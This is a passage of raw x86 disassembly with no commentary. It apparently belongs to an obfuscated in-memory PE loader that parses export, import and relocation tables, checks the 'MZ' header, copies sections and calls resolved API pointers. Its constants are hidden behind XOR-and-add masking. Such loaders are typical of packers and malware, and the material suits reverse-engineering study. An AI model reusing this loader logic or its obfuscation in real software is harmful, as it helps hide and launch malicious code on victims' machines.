  42586e:	mov    ecx,DWORD PTR [ebp-0x14]
  425871:	inc    DWORD PTR [ebp-0xc]
  425874:	add    ecx,0x8
  425877:	add    edi,ebx
  425879:	mov    DWORD PTR [ebp-0x14],ecx
  42587c:	cmp    DWORD PTR [ebp-0xc],edi
  42587f:	jb     0x425821
  425881:	mov    ecx,DWORD PTR [ebp-0x18]
  425884:	movzx  edx,WORD PTR [eax+0xe]
  425888:	movzx  edi,WORD PTR [eax+0xc]
  42588c:	inc    DWORD PTR [ebp-0x10]
  42588f:	add    ecx,0x8
  425892:	add    edx,edi
  425894:	mov    DWORD PTR [ebp-0x18],ecx
  425897:	cmp    DWORD PTR [ebp-0x10],edx
  42589a:	jb     0x425801
  4258a0:	pop    edi
  4258a1:	pop    ebx
  4258a2:	xor    eax,eax
  4258a4:	inc    eax
  4258a5:	jmp    0x4258a9
  4258a7:	xor    eax,eax
  4258a9:	pop    esi
  4258aa:	leave  
  4258ab:	ret    
  4258ac:	push   ebp
  4258ad:	mov    ebp,esp
  4258af:	mov    ecx,DWORD PTR [ecx+0x190]
  4258b5:	mov    eax,DWORD PTR [ebp+0xc]
  4258b8:	sub    esp,0x10
  4258bb:	push   ebx
  4258bc:	xor    ebx,ebx
  4258be:	push   esi
  4258bf:	push   edi
  4258c0:	cmp    DWORD PTR [ecx],ebx
  4258c2:	je     0x42594a
  4258c8:	cmp    eax,ebx
  4258ca:	je     0x42594a
  4258cc:	cmp    DWORD PTR [eax+0x78],ebx
  4258cf:	jne    0x4258d6
  4258d1:	xor    eax,eax
  4258d3:	inc    eax
  4258d4:	jmp    0x42594c
  4258d6:	mov    eax,DWORD PTR [eax+0x78]
  4258d9:	add    eax,DWORD PTR [ebp+0x8]
  4258dc:	mov    ecx,DWORD PTR [eax+0x1c]
  4258df:	mov    edx,DWORD PTR [eax+0x24]
  4258e2:	mov    esi,DWORD PTR [eax+0x14]
  4258e5:	mov    edi,DWORD PTR [eax+0x18]
  4258e8:	add    ecx,DWORD PTR [ebp+0x8]
  4258eb:	add    edx,DWORD PTR [ebp+0x8]
  4258ee:	mov    DWORD PTR [ebp-0x4],esi
  4258f1:	cmp    esi,edi
  4258f3:	ja     0x4258f8
  4258f5:	mov    DWORD PTR [ebp-0x4],edi
  4258f8:	mov    DWORD PTR [ebp-0x8],ebx
  4258fb:	cmp    DWORD PTR [ebp-0x4],ebx
  4258fe:	jbe    0x4258d1
  425900:	cmp    ebx,DWORD PTR [eax+0x14]
  425903:	jae    0x42590b
  425905:	movzx  esi,WORD PTR [edx+ebx*2]
  425909:	jmp    0x42590d
  42590b:	mov    esi,ebx
  42590d:	lea    esi,[ecx+esi*4]
  425910:	mov    edi,DWORD PTR [esi]
  425912:	test   edi,edi
  425914:	je     0x42593f
  425916:	add    edi,DWORD PTR [ebp+0x8]
  425919:	mov    DWORD PTR [ebp-0x10],edi
  42591c:	cmp    edi,eax
  42591e:	jbe    0x425930
  425920:	mov    ebx,DWORD PTR [ebp+0xc]
  425923:	mov    ebx,DWORD PTR [ebx+0x7c]
  425926:	add    ebx,eax
  425928:	cmp    edi,ebx
  42592a:	jae    0x425930
  42592c:	mov    esi,DWORD PTR [esi]
  42592e:	jmp    0x425938
  425930:	sub    edi,DWORD PTR [ebp+0x8]
  425933:	mov    DWORD PTR [esi],edi
  425935:	mov    esi,DWORD PTR [ebp-0x10]
  425938:	test   esi,esi
  42593a:	je     0x42594a
  42593c:	mov    ebx,DWORD PTR [ebp-0x8]
  42593f:	inc    ebx
  425940:	mov    DWORD PTR [ebp-0x8],ebx
  425943:	cmp    ebx,DWORD PTR [ebp-0x4]
  425946:	jb     0x425900
  425948:	jmp    0x4258d1
  42594a:	xor    eax,eax
  42594c:	pop    edi
  42594d:	pop    esi
  42594e:	pop    ebx
  42594f:	leave  
  425950:	ret    0x8
  425953:	push   ebp
  425954:	mov    ebp,esp
  425956:	sub    esp,0x2c
  425959:	mov    edx,0xf89c85b0
  42595e:	mov    DWORD PTR [ebp-0x4],edx
  425961:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  425968:	mov    eax,DWORD PTR [ebp-0x4]
  42596b:	mov    ecx,DWORD PTR [ebp-0x4]
  42596e:	mov    ecx,DWORD PTR [ebp-0x4]
  425971:	mov    ecx,DWORD PTR [ebp-0x4]
  425974:	mov    ecx,DWORD PTR [ebp-0x4]
  425977:	mov    ecx,DWORD PTR [ebp-0x4]
  42597a:	push   ebx
  42597b:	mov    ebx,DWORD PTR [ebp+0x10]
  42597e:	push   esi
  42597f:	mov    esi,0x75108a4
  425984:	mov    DWORD PTR [ebp-0x10],0x352eb2e
  42598b:	mov    ecx,DWORD PTR [ebp-0x4]
  42598e:	mov    ebx,DWORD PTR [ebx+0x190]
  425994:	push   edi
  425995:	mov    edi,0x3272ec
  42599a:	xor    ecx,esi
  42599c:	xor    eax,esi
  42599e:	add    eax,edi
  4259a0:	add    ecx,edi
  4259a2:	mov    DWORD PTR [ebp-0x18],eax
  4259a5:	cmp    ecx,DWORD PTR [ebx]
  4259a7:	je     0x425c28
  4259ad:	mov    ebx,DWORD PTR [ebp-0x4]
  4259b0:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b3:	xor    ebx,esi
  4259b5:	add    ebx,edi
  4259b7:	cmp    ebx,ecx
  4259b9:	je     0x425c28
  4259bf:	mov    ebx,DWORD PTR [ebp-0x4]
  4259c2:	mov    ecx,DWORD PTR [ecx+0x80]
  4259c8:	xor    ebx,esi
  4259ca:	add    ebx,edi
  4259cc:	cmp    ecx,ebx
  4259ce:	je     0x425c23
  4259d4:	add    ecx,DWORD PTR [ebp+0x8]
  4259d7:	mov    DWORD PTR [ebp-0x2c],ecx
  4259da:	mov    ebx,edx
  4259dc:	xor    ebx,esi
  4259de:	add    ebx,edi
  4259e0:	mov    DWORD PTR [ebp-0x10],ebx
  4259e3:	mov    ebx,DWORD PTR [ebp-0x10]
  4259e6:	cmp    ebx,edx
  4259e8:	je     0x4259fc
  4259ea:	mov    edx,DWORD PTR [ebp-0x10]
  4259ed:	mov    ebx,DWORD PTR [ebp-0x4]
  4259f0:	imul   edx,edx,0x14
  4259f3:	xor    ebx,esi
  4259f5:	add    ebx,edi
  4259f7:	cmp    DWORD PTR [edx+ecx*1],ebx
  4259fa:	jne    0x425a13
  4259fc:	mov    edx,DWORD PTR [ebp-0x10]
  4259ff:	mov    ebx,DWORD PTR [ebp-0x4]
  425a02:	imul   edx,edx,0x14
  425a05:	xor    ebx,esi
  425a07:	add    ebx,edi
  425a09:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425a0d:	je     0x425c15
  425a13:	mov    eax,DWORD PTR [ebp-0x4]
  425a16:	mov    ebx,DWORD PTR [ebp-0x4]
  425a19:	mov    eax,DWORD PTR [ebp-0x10]
  425a1c:	imul   eax,eax,0x14
  425a1f:	add    eax,ecx
  425a21:	mov    ecx,DWORD PTR [eax+0x10]
  425a24:	add    ecx,DWORD PTR [ebp+0x8]
  425a27:	xor    ebx,esi
  425a29:	mov    DWORD PTR [ebp-0x1c],ecx
  425a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  425a2f:	mov    edx,DWORD PTR [ebp-0x4]
  425a32:	xor    ecx,esi
  425a34:	add    ecx,edi
  425a36:	xor    edx,esi
  425a38:	mov    DWORD PTR [ebp-0x24],ecx
  425a3b:	mov    ecx,DWORD PTR [eax]
  425a3d:	add    edx,edi
  425a3f:	add    ebx,edi
  425a41:	cmp    ecx,edx
  425a43:	je     0x425a4b
  425a45:	add    ecx,DWORD PTR [ebp+0x8]
  425a48:	mov    DWORD PTR [ebp-0x24],ecx
  425a4b:	mov    ecx,DWORD PTR [ebp-0x4]
  425a4e:	xor    ecx,esi
  425a50:	add    ecx,DWORD PTR [eax+0xc]
  425a53:	mov    eax,DWORD PTR [ebp+0x8]
  425a56:	lea    eax,[ecx+eax*1+0x3272ec]
  425a5d:	mov    DWORD PTR [ebp+0xc],eax
  425a60:	mov    DWORD PTR [ebp-0x28],0xf89c85bd
  425a67:	mov    eax,DWORD PTR [ebp+0x10]
  425a6a:	push   DWORD PTR [ebp+0xc]
  425a6d:	mov    eax,DWORD PTR [eax+0x1d8]
  425a73:	call   DWORD PTR [eax]
  425a75:	mov    ecx,DWORD PTR [ebp-0x4]
  425a78:	xor    ecx,esi
  425a7a:	add    ecx,edi
  425a7c:	mov    DWORD PTR [ebp-0xc],eax
  425a7f:	cmp    ecx,eax
  425a81:	jne    0x425a95
  425a83:	mov    eax,DWORD PTR [ebp+0x10]
  425a86:	push   DWORD PTR [ebp+0xc]
  425a89:	mov    eax,DWORD PTR [eax+0x1d8]
  425a8f:	call   DWORD PTR [eax+0xc]
  425a92:	mov    DWORD PTR [ebp-0xc],eax
  425a95:	mov    DWORD PTR [ebp-0x20],0x7f661b29
  425a9c:	mov    DWORD PTR [ebp-0x20],0xf89c9859
  425aa3:	mov    eax,DWORD PTR [ebp-0x4]
  425aa6:	xor    eax,esi
  425aa8:	add    eax,edi
  425aaa:	cmp    eax,DWORD PTR [ebp-0xc]
  425aad:	jne    0x425ad2
  425aaf:	mov    eax,DWORD PTR [ebp-0x8]
  425ab2:	mov    ecx,DWORD PTR [ebp-0x20]
  425ab5:	xor    eax,esi
  425ab7:	xor    ecx,esi
  425ab9:	lea    ebx,[ebx+eax*1+0x3272ec]
  425ac0:	mov    eax,DWORD PTR [ebp+0x10]
  425ac3:	mov    eax,DWORD PTR [eax+0x1d8]
  425ac9:	add    ecx,edi
  425acb:	imul   ecx,ebx
  425ace:	push   ecx
  425acf:	call   DWORD PTR [eax+0x24]
  425ad2:	mov    eax,DWORD PTR [ebp-0x4]
  425ad5:	xor    eax,esi
  425ad7:	add    eax,edi
  425ad9:	cmp    eax,DWORD PTR [ebp-0xc]
  425adc:	jne    0x425aed
  425ade:	mov    eax,DWORD PTR [ebp-0x28]
  425ae1:	xor    eax,esi
  425ae3:	add    eax,edi
  425ae5:	cmp    ebx,eax
  425ae7:	jbe    0x425a67
  425aed:	mov    eax,DWORD PTR [ebp-0x4]
  425af0:	xor    eax,esi
  425af2:	add    eax,edi
  425af4:	cmp    eax,DWORD PTR [ebp-0xc]
  425af7:	jne    0x425b10
  425af9:	mov    eax,DWORD PTR [ebp-0x8]
  425afc:	mov    ecx,DWORD PTR [ebp-0x18]
  425aff:	xor    eax,esi
  425b01:	lea    eax,[ecx+eax*1+0x3272ec]
  425b08:	mov    DWORD PTR [ebp-0x18],eax
  425b0b:	jmp    0x425bff
  425b10:	mov    DWORD PTR [ebp-0x14],0x1121b28
  425b17:	mov    DWORD PTR [ebp+0xc],0xe042d2e
  425b1e:	mov    ebx,DWORD PTR [ebp-0x4]
  425b21:	xor    ebx,esi
  425b23:	add    ebx,edi
  425b25:	jmp    0x425bec
  425b2a:	mov    eax,DWORD PTR [ebp-0x4]
  425b2d:	xor    eax,esi
  425b2f:	add    eax,edi
  425b31:	mov    DWORD PTR [ebp-0x14],eax
  425b34:	mov    eax,DWORD PTR [ebp-0x4]
  425b37:	xor    eax,esi
  425b39:	add    eax,edi
  425b3b:	mov    DWORD PTR [ebp+0xc],eax
  425b3e:	mov    ecx,DWORD PTR [ebp-0x4]
  425b41:	mov    eax,DWORD PTR [ebp-0x24]
  425b44:	xor    ecx,esi
  425b46:	add    ecx,edi
  425b48:	cmp    ecx,eax
  425b4a:	je     0x425b52
  425b4c:	mov    eax,DWORD PTR [eax+ebx*4]
  425b4f:	mov    DWORD PTR [ebp-0x14],eax
  425b52:	mov    eax,DWORD PTR [ebp-0x1c]
  425b55:	mov    eax,DWORD PTR [eax+ebx*4]
  425b58:	mov    DWORD PTR [ebp+0xc],eax
  425b5b:	mov    eax,DWORD PTR [ebp-0x4]
  425b5e:	mov    ecx,DWORD PTR [ebp-0x14]
  425b61:	xor    eax,esi
  425b63:	add    eax,edi
  425b65:	cmp    eax,ecx
  425b67:	je     0x425b92
  425b69:	mov    eax,DWORD PTR [ebp-0x4]
  425b6c:	mov    ecx,DWORD PTR [ebp-0x14]
  425b6f:	xor    eax,esi
  425b71:	add    eax,edi
  425b73:	shr    ecx,0x1f
  425b76:	cmp    eax,ecx
  425b78:	je     0x425b92
  425b7a:	mov    ecx,DWORD PTR [ebp-0x14]
  425b7d:	mov    eax,DWORD PTR [ebp+0x10]
  425b80:	mov    eax,DWORD PTR [eax+0x1d8]
  425b86:	movzx  ecx,cx
  425b89:	push   ecx
  425b8a:	push   DWORD PTR [ebp-0xc]
  425b8d:	call   DWORD PTR [eax+0x8]
  425b90:	jmp    0x425bab
  425b92:	mov    eax,DWORD PTR [ebp+0xc]
  425b95:	add    eax,DWORD PTR [ebp+0x8]
  425b98:	mov    ecx,DWORD PTR [ebp+0x10]
  425b9b:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425ba1:	add    eax,0x2
  425ba4:	push   eax
  425ba5:	push   DWORD PTR [ebp-0xc]
  425ba8:	call   DWORD PTR [ecx+0x8]
  425bab:	mov    DWORD PTR [ebp+0xc],eax
  425bae:	mov    eax,DWORD PTR [ebp-0x4]
  425bb1:	mov    ecx,DWORD PTR [ebp+0xc]
  425bb4:	xor    eax,esi
  425bb6:	add    eax,edi
  425bb8:	cmp    eax,ecx
  425bba:	mov    eax,DWORD PTR [ebp-0x8]
  425bbd:	jne    0x425bd0
  425bbf:	mov    ecx,DWORD PTR [ebp-0x18]
  425bc2:	xor    eax,esi
  425bc4:	lea    eax,[ecx+eax*1+0x3272ec]
  425bcb:	mov    DWORD PTR [ebp-0x18],eax
  425bce:	jmp    0x425be0
  425bd0:	mov    ecx,DWORD PTR [ebp+0xc]
  425bd3:	xor    eax,esi
  425bd5:	add    eax,edi
  425bd7:	imul   eax,ecx
  425bda:	mov    ecx,DWORD PTR [ebp-0x1c]
  425bdd:	mov    DWORD PTR [ecx+ebx*4],eax
  425be0:	mov    eax,DWORD PTR [ebp-0x8]
  425be3:	xor    eax,esi
  425be5:	lea    ebx,[ebx+eax*1+0x3272ec]
  425bec:	mov    eax,DWORD PTR [ebp-0x4]
  425bef:	mov    ecx,DWORD PTR [ebp-0x1c]
  425bf2:	xor    eax,esi
  425bf4:	add    eax,edi
  425bf6:	cmp    DWORD PTR [ecx+ebx*4],eax
  425bf9:	jne    0x425b2a
  425bff:	mov    edx,DWORD PTR [ebp-0x10]
  425c02:	mov    ecx,DWORD PTR [ebp-0x2c]
  425c05:	mov    eax,DWORD PTR [ebp-0x18]
  425c08:	sub    edx,0x3272eb
  425c0e:	xor    edx,esi
  425c10:	jmp    0x4259da
  425c15:	mov    ecx,DWORD PTR [ebp-0x4]
  425c18:	xor    ecx,esi
  425c1a:	add    ecx,edi
  425c1c:	cmp    eax,ecx
  425c1e:	mov    eax,DWORD PTR [ebp-0x4]
  425c21:	jne    0x425c2b
  425c23:	mov    eax,DWORD PTR [ebp-0x8]
  425c26:	jmp    0x425c2b
  425c28:	mov    eax,DWORD PTR [ebp-0x4]
  425c2b:	xor    eax,esi
  425c2d:	add    eax,edi
  425c2f:	pop    edi
  425c30:	pop    esi
  425c31:	pop    ebx
  425c32:	leave  
  425c33:	ret    0xc
  425c36:	push   ebp
  425c37:	mov    ebp,esp
  425c39:	sub    esp,0x28
  425c3c:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  425c43:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  425c4a:	mov    eax,DWORD PTR [ebp+0xc]
  425c4d:	mov    DWORD PTR [ebp+0xc],eax
  425c50:	push   esi
  425c51:	mov    eax,eax
  425c53:	mov    eax,DWORD PTR [ebp-0x4]
  425c56:	mov    esi,DWORD PTR [ebp+0x8]
  425c59:	mov    ecx,0x75108a4
  425c5e:	xor    eax,ecx
  425c60:	mov    edx,0x3272ec
  425c65:	add    eax,edx
  425c67:	cmp    esi,eax
  425c69:	je     0x425d90
  425c6f:	mov    eax,DWORD PTR [ebp+0x8]
  425c72:	mov    esi,DWORD PTR [ebp+0x8]
  425c75:	add    esi,DWORD PTR [eax+0x3c]
  425c78:	push   edi
  425c79:	mov    DWORD PTR [ebp+0xc],esi
  425c7c:	mov    DWORD PTR [ebp-0x1c],0xf89c85bd
  425c83:	mov    eax,DWORD PTR [ebp-0x1c]
  425c86:	mov    esi,DWORD PTR [ebp-0x4]
  425c89:	mov    edi,DWORD PTR [ebp+0xc]
  425c8c:	xor    esi,ecx
  425c8e:	xor    eax,ecx
  425c90:	add    esi,edx
  425c92:	cmp    DWORD PTR [edi+eax*8+0x19397d8],esi
  425c99:	je     0x425d8a
  425c9f:	mov    esi,DWORD PTR [ebp+0xc]
  425ca2:	mov    eax,DWORD PTR [ebp+0x8]
  425ca5:	add    eax,DWORD PTR [esi+0xa0]
  425cab:	mov    esi,DWORD PTR [ebp+0x8]
  425cae:	mov    edi,DWORD PTR [ebp+0xc]
  425cb1:	sub    esi,DWORD PTR [edi+0x34]
  425cb4:	mov    edi,DWORD PTR [ebp-0x4]
  425cb7:	xor    edi,ecx
  425cb9:	add    edi,edx
  425cbb:	mov    DWORD PTR [ebp-0x24],esi
  425cbe:	cmp    esi,edi
  425cc0:	je     0x425d8a
  425cc6:	mov    esi,DWORD PTR [ebp-0x4]
  425cc9:	xor    esi,ecx
  425ccb:	add    esi,edx
  425ccd:	mov    DWORD PTR [ebp-0x8],esi
  425cd0:	push   ebx
  425cd1:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  425cd8:	jmp    0x425d74
  425cdd:	mov    esi,DWORD PTR [ebp-0x4]
  425ce0:	xor    esi,ecx
  425ce2:	lea    edi,[ebx-0x8]
  425ce5:	add    esi,edx
  425ce7:	shr    edi,1
  425ce9:	cmp    esi,edi
  425ceb:	jae    0x425d5a
  425ced:	sub    edi,esi
  425cef:	lea    ebx,[eax+esi*2+0x8]
  425cf3:	mov    DWORD PTR [ebp-0x18],edi
  425cf6:	movzx  esi,WORD PTR [ebx]
  425cf9:	and    esi,0xfff
  425cff:	mov    DWORD PTR [ebp-0x14],esi
  425d02:	mov    edi,DWORD PTR [ebp-0x14]
  425d05:	mov    esi,DWORD PTR [eax]
  425d07:	sub    esi,edx
  425d09:	add    edi,esi
  425d0b:	movzx  esi,WORD PTR [ebx]
  425d0e:	shr    esi,0xc
  425d11:	xor    edi,ecx
  425d13:	mov    DWORD PTR [ebp-0x20],edi
  425d16:	mov    DWORD PTR [ebp-0x14],esi
  425d19:	mov    esi,DWORD PTR [ebp-0x20]
  425d1c:	mov    edi,DWORD PTR [ebp+0x8]
  425d1f:	xor    esi,ecx
  425d21:	lea    esi,[esi+edi*1+0x3272ec]
  425d28:	mov    DWORD PTR [ebp-0x20],esi
  425d2b:	mov    esi,DWORD PTR [ebp-0x10]
  425d2e:	mov    edi,DWORD PTR [ebp-0x14]
  425d31:	xor    esi,ecx
  425d33:	add    esi,edx
  425d35:	cmp    edi,esi
  425d37:	jne    0x425d4f
  425d39:	mov    esi,DWORD PTR [ebp-0x10]
  425d3c:	mov    edi,DWORD PTR [ebp-0x14]
  425d3f:	xor    esi,ecx
  425d41:	add    esi,edx
  425d43:	cmp    edi,esi
  425d45:	jne    0x425d4f
  425d47:	mov    esi,DWORD PTR [ebp-0x20]
  425d4a:	mov    edi,DWORD PTR [ebp-0x24]
  425d4d:	add    DWORD PTR [esi],edi
  425d4f:	add    ebx,0x2
  425d52:	dec    DWORD PTR [ebp-0x18]
  425d55:	jne    0x425cf6
  425d57:	mov    ebx,DWORD PTR [ebp-0xc]
  425d5a:	add    DWORD PTR [ebp-0x8],ebx
  425d5d:	mov    esi,DWORD PTR [ebp-0x1c]
  425d60:	mov    edi,DWORD PTR [ebp-0x8]
  425d63:	mov    ebx,DWORD PTR [ebp+0xc]
  425d66:	xor    esi,ecx
  425d68:	cmp    edi,DWORD PTR [ebx+esi*8+0x19397dc]
  425d6f:	jae    0x425d89
  425d71:	add    eax,DWORD PTR [ebp-0xc]
  425d74:	mov    esi,DWORD PTR [ebp-0x4]
  425d77:	mov    ebx,DWORD PTR [eax+0x4]
  425d7a:	xor    esi,ecx
  425d7c:	add    esi,edx
  425d7e:	mov    DWORD PTR [ebp-0xc],ebx
  425d81:	cmp    ebx,esi
  425d83:	jne    0x425cdd
  425d89:	pop    ebx
  425d8a:	mov    eax,DWORD PTR [ebp-0x28]
  425d8d:	pop    edi
  425d8e:	jmp    0x425d93
  425d90:	mov    eax,DWORD PTR [ebp-0x4]
  425d93:	xor    eax,ecx
  425d95:	add    eax,edx
  425d97:	pop    esi
  425d98:	leave  
  425d99:	ret    0x8
  425d9c:	push   ebp
  425d9d:	mov    ebp,esp
  425d9f:	sub    esp,0xd8
  425da5:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  425dac:	mov    DWORD PTR [ebp-0x24],0xf89c85b1
  425db3:	mov    eax,DWORD PTR [ebp-0x4]
  425db6:	push   ebx
  425db7:	push   esi
  425db8:	mov    esi,0x75108a4
  425dbd:	xor    eax,esi
  425dbf:	push   edi
  425dc0:	mov    edi,0x3272ec
  425dc5:	add    eax,edi
  425dc7:	mov    DWORD PTR [ebp-0x18],eax
  425dca:	mov    eax,DWORD PTR [ebp-0x4]
  425dcd:	xor    eax,esi
  425dcf:	add    eax,edi
  425dd1:	mov    DWORD PTR [ebp-0x8],eax
  425dd4:	mov    ebx,DWORD PTR [ebp+0x20]
  425dd7:	mov    eax,DWORD PTR [ebp-0x1c]
  425dda:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ddd:	xor    eax,ecx
  425ddf:	mov    DWORD PTR [ebp-0x1c],eax
  425de2:	add    DWORD PTR [ebp-0x1c],0xf89cb5b0
  425de9:	mov    eax,DWORD PTR [ebp-0xc]
  425dec:	mov    ecx,DWORD PTR [ebp-0xc]
  425def:	xor    eax,ecx
  425df1:	mov    DWORD PTR [ebp-0xc],eax
  425df4:	add    DWORD PTR [ebp-0xc],0xf89c85f0
  425dfb:	mov    eax,DWORD PTR [ebp-0x10]
  425dfe:	mov    ecx,DWORD PTR [ebp-0x10]
  425e01:	xor    eax,ecx
  425e03:	mov    DWORD PTR [ebp-0x10],eax
  425e06:	add    DWORD PTR [ebp-0x10],0xf89c85bc
  425e0d:	mov    eax,DWORD PTR [ebp-0x28]
  425e10:	mov    ecx,DWORD PTR [ebp-0x28]
  425e13:	xor    eax,ecx
  425e15:	mov    DWORD PTR [ebp-0x28],eax
  425e18:	add    DWORD PTR [ebp-0x28],0xf89f05b0
  425e1f:	mov    DWORD PTR [ebp+0x20],0xf89cefc5
  425e26:	mov    eax,DWORD PTR [ebp+0x8]
  425e29:	test   eax,eax
  425e2b:	je     0x4262b6
  425e31:	mov    eax,DWORD PTR [ebp+0xc]
  425e34:	test   eax,eax
  425e36:	je     0x4262b6
  425e3c:	mov    eax,DWORD PTR [ebp+0x18]
  425e3f:	test   eax,eax
  425e41:	je     0x4262b6
  425e47:	mov    eax,DWORD PTR [ebp+0x20]
  425e4a:	mov    ecx,DWORD PTR [ebp+0x8]
  425e4d:	xor    eax,0x8a4
  425e52:	add    eax,0x72ec
  425e57:	cmp    WORD PTR [ecx],ax
  425e5a:	jne    0x4262b6
  425e60:	mov    eax,DWORD PTR [ebp-0x4]
  425e63:	xor    eax,esi
  425e65:	add    eax,edi
  425e67:	mov    DWORD PTR [ebp-0x30],eax
  425e6a:	mov    eax,DWORD PTR [ebp-0x4]
  425e6d:	mov    ecx,DWORD PTR [ebp+0x8]
  425e70:	mov    eax,DWORD PTR [ebp+0x8]
  425e73:	add    eax,DWORD PTR [ecx+0x3c]
  425e76:	mov    DWORD PTR [ebp+0xc],eax
  425e79:	mov    eax,DWORD PTR [eax+0x50]
  425e7c:	test   eax,eax
  425e7e:	je     0x4262b6
  425e84:	mov    DWORD PTR [ebp-0x2c],0xf88c85b0
  425e8b:	mov    eax,DWORD PTR [ebp-0x2c]
  425e8e:	xor    eax,esi
  425e90:	add    eax,edi
  425e92:	mov    DWORD PTR [ebp-0x2c],eax
  425e95:	mov    eax,DWORD PTR [ebp-0x4]
  425e98:	mov    eax,DWORD PTR [ebx+0x190]
  425e9e:	mov    ecx,DWORD PTR [eax]
  425ea0:	mov    ecx,DWORD PTR [ecx+0x3c]
  425ea3:	add    ecx,DWORD PTR [eax]
  425ea5:	mov    eax,DWORD PTR [ebp-0x4]
  425ea8:	mov    eax,DWORD PTR [ebx+0x18c]
  425eae:	mov    edx,DWORD PTR [eax]
  425eb0:	mov    DWORD PTR [ebp-0x20],ecx
  425eb3:	mov    DWORD PTR [ebp+0x20],edx
  425eb6:	cmp    edx,edx
  425eb8:	jne    0x425eec
  425eba:	mov    eax,DWORD PTR [ebx+0x1d8]
  425ec0:	lea    edx,[ebp-0x18]
  425ec3:	push   edx
  425ec4:	mov    edx,DWORD PTR [ebp-0xc]
  425ec7:	xor    edx,esi
  425ec9:	add    edx,edi
  425ecb:	push   edx
  425ecc:	push   DWORD PTR [ecx+0x50]
  425ecf:	push   DWORD PTR [ebp+0x20]
  425ed2:	call   DWORD PTR [eax+0x1c]
  425ed5:	mov    eax,DWORD PTR [ebp-0x20]
  425ed8:	mov    ecx,DWORD PTR [eax+0x54]
  425edb:	mov    eax,DWORD PTR [eax+0x50]
  425ede:	sub    eax,ecx
  425ee0:	add    ecx,DWORD PTR [ebp+0x20]
  425ee3:	push   ecx
  425ee4:	call   0x426853
  425ee9:	mov    edx,DWORD PTR [ebp+0x20]
  425eec:	mov    eax,DWORD PTR [ebx+0x194]
  425ef2:	mov    DWORD PTR [eax],edx
  425ef4:	mov    eax,DWORD PTR [ebp+0xc]
  425ef7:	push   DWORD PTR [eax+0x54]
  425efa:	push   DWORD PTR [ebp+0x8]
  425efd:	push   edx
  425efe:	call   0x426749
  425f03:	mov    ecx,DWORD PTR [ebp+0x20]
  425f06:	mov    eax,DWORD PTR [ecx+0x3c]
  425f09:	add    eax,ecx
  425f0b:	movzx  ecx,WORD PTR [eax+0x14]
  425f0f:	lea    ecx,[ecx+eax*1+0x18]
  425f13:	mov    DWORD PTR [ebp+0x18],ecx
  425f16:	mov    ecx,DWORD PTR [ebp-0x4]
  425f19:	movzx  edx,WORD PTR [eax+0x6]
  425f1d:	xor    ecx,esi
  425f1f:	add    ecx,edi
  425f21:	mov    DWORD PTR [ebp+0xc],eax
  425f24:	cmp    edx,ecx
  425f26:	je     0x425fd3
  425f2c:	mov    ecx,DWORD PTR [ebp-0x4]
  425f2f:	xor    ecx,esi
  425f31:	add    ecx,edi
  425f33:	mov    DWORD PTR [ebp-0x8],ecx
  425f36:	mov    ecx,DWORD PTR [ebp-0x24]
  425f39:	movzx  edx,WORD PTR [eax+0x6]
  425f3d:	xor    ecx,esi
  425f3f:	sub    edx,ecx
  425f41:	sub    edx,edi
  425f43:	cmp    DWORD PTR [ebp-0x8],edx
  425f46:	ja     0x425fd3
  425f4c:	mov    edx,DWORD PTR [ebp+0x18]
  425f4f:	add    edx,0x8
  425f52:	mov    DWORD PTR [ebp+0x18],edx
  425f55:	jmp    0x425f5a
  425f57:	mov    edx,DWORD PTR [ebp+0x18]
  425f5a:	mov    eax,DWORD PTR [eax+0x38]
  425f5d:	lea    ecx,[eax-0x1]
  425f60:	mov    DWORD PTR [ebp-0x38],eax
  425f63:	mov    eax,DWORD PTR [edx]
  425f65:	test   eax,ecx
  425f67:	je     0x425f70
  425f69:	not    ecx
  425f6b:	and    eax,ecx
  425f6d:	add    eax,DWORD PTR [ebp-0x38]
  425f70:	mov    ecx,DWORD PTR [edx+0x4]
  425f73:	add    ecx,DWORD PTR [ebp+0x20]
  425f76:	push   ecx
  425f77:	call   0x426853
  425f7c:	mov    edx,DWORD PTR [ebp-0x4]
  425f7f:	mov    eax,DWORD PTR [ebp+0x18]
  425f82:	mov    ecx,DWORD PTR [eax+0x8]
  425f85:	xor    edx,esi
  425f87:	add    edx,edi
  425f89:	cmp    ecx,edx
  425f8b:	je     0x425fa4
  425f8d:	push   ecx
  425f8e:	mov    ecx,DWORD PTR [ebp+0x8]
  425f91:	add    ecx,DWORD PTR [eax+0xc]
  425f94:	mov    eax,DWORD PTR [eax+0x4]
  425f97:	add    eax,DWORD PTR [ebp+0x20]
  425f9a:	push   ecx
  425f9b:	push   eax
  425f9c:	call   0x426749
  425fa1:	mov    eax,DWORD PTR [ebp+0x18]
  425fa4:	mov    ecx,DWORD PTR [ebp-0x24]
  425fa7:	mov    edx,DWORD PTR [ebp-0x8]
  425faa:	add    eax,0x28
  425fad:	xor    ecx,esi
  425faf:	lea    ecx,[edx+ecx*1+0x3272ec]
  425fb6:	mov    edx,DWORD PTR [ebp+0xc]
  425fb9:	mov    DWORD PTR [ebp+0x18],eax
  425fbc:	mov    eax,DWORD PTR [ebp-0x24]
  425fbf:	movzx  edx,WORD PTR [edx+0x6]
  425fc3:	xor    eax,esi
  425fc5:	sub    edx,eax
  425fc7:	mov    eax,DWORD PTR [ebp+0xc]
  425fca:	sub    edx,edi
  425fcc:	mov    DWORD PTR [ebp-0x8],ecx
  425fcf:	cmp    ecx,edx
  425fd1:	jbe    0x425f57
  425fd3:	mov    edx,DWORD PTR [ebx+0x18c]
  425fd9:	mov    ecx,DWORD PTR [ebp+0x20]
  425fdc:	cmp    ecx,DWORD PTR [edx]
  425fde:	jne    0x426007
  425fe0:	mov    eax,DWORD PTR [ebx+0x1d8]
  425fe6:	lea    edx,[ebp-0x18]
  425fe9:	push   edx
  425fea:	mov    edx,DWORD PTR [ebp-0x10]
  425fed:	xor    edx,esi
  425fef:	add    edx,edi
  425ff1:	push   edx
  425ff2:	mov    edx,DWORD PTR [ebp-0x20]
  425ff5:	push   DWORD PTR [edx+0x54]
  425ff8:	push   ecx
  425ff9:	call   DWORD PTR [eax+0x1c]
  425ffc:	test   eax,eax
